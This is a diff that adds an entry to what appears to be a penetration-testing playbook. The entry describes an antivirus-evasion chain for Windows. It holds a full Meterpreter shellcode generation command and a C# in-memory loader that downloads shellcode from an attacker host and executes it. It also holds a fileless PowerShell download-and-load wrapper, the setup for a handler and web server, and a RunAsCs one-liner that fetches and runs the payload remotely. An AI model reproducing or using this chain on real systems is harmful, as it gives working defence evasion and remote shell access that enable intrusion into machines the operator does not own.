@@ -225,3 +225,57 @@
   foreach (PSObject obj in results) { Console.WriteLine(obj.ToString()); }
   runspace.Close();
   ```
+
+### C# Shellcode Loader (VirtualProtect Delegate, AV Bypass) [added: 2026-04]
+- **Tags:** #CSharpLoader #Shellcode #DefenseEvasion #AMSI #AVBypass #Meterpreter #VirtualProtect
+- **Trigger:** AV/Defender blocks standard Meterpreter .exe uploads; need interactive shell from non-interactive WinRM context
+- **Prereq:** Linux attacker with mono-mcs; Evil-WinRM or similar shell; RunAsCs.exe on target; Python3 web server reachable; Metasploit handler ready
+- **Yields:** Interactive Meterpreter session as target user, bypassing Windows Defender; enables tools requiring interactive logon (PowerUp, Whisker, etc.)
+- **Opsec:** Med
+- **Context:** Standard msfvenom .exe is AV-detected. This chain: (1) generates raw shellcode, (2) wraps it in a C# in-memory loader using VirtualProtect+delegate execution (no disk-written shellcode), (3) compiles on Linux with mono, (4) loads via PowerShell Assembly::Load (fileless), (5) RunAsCs -l 3 forces an interactive logon type needed for UAC-sensitive tools.
+- **Payload/Method:**
+  ```bash
+  # 1. Generate raw shellcode
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f raw -o zephyr-win.bin
+
+  # 2. C# loader (save as payload.cs)
+  cat > payload.cs << 'EOF'
+  using System; using System.Net; using System.Runtime.InteropServices;
+  namespace Loader {
+    public class Program {
+      public delegate void Grunt();
+      [DllImport("kernel32.dll")]
+      public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+      public static void Main() {
+        var wc = new WebClient();
+        var sc = wc.DownloadData("http://<IP>/zephyr-win.bin");
+        GCHandle pinned = GCHandle.Alloc(sc, GCHandleType.Pinned);
+        IntPtr ptr = pinned.AddrOfPinnedObject();
+        Marshal.Copy(sc, 0, ptr, sc.Length);
+        uint lpflOldProtect;
+        VirtualProtect(ptr, (UIntPtr)sc.Length, 0x40, out lpflOldProtect);
+        Grunt exec = Marshal.GetDelegateForFunctionPointer<Grunt>(ptr);
+        exec();
+      }
+    }
+  }
+  EOF
+
+  # 3. Compile on Linux
+  sudo apt install mono-mcs -y
+  mcs payload.cs    # produces payload.exe
+
+  # 4. PowerShell wrapper (payload.ps1) — hosted on attacker web server
+  cat > payload.ps1 << 'EOF'
+  $bytes = (new-object net.webclient).downloaddata('http://<IP>/payload.exe')
+  [System.Reflection.Assembly]::Load($bytes)
+  [Reflection.Program]::Main()
+  EOF
+
+  # 5. Start web server serving both files + Metasploit handler
+  sudo python3 -m http.server 80
+  # msf: use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; run
+
+  # 6. Trigger from Evil-WinRM using RunAsCs for interactive logon
+  .\RunAsCs.exe -l 3 <user> <password> -d <domain> 'powershell iex(iwr -useb http://<IP>/payload.ps1)'
+  ```
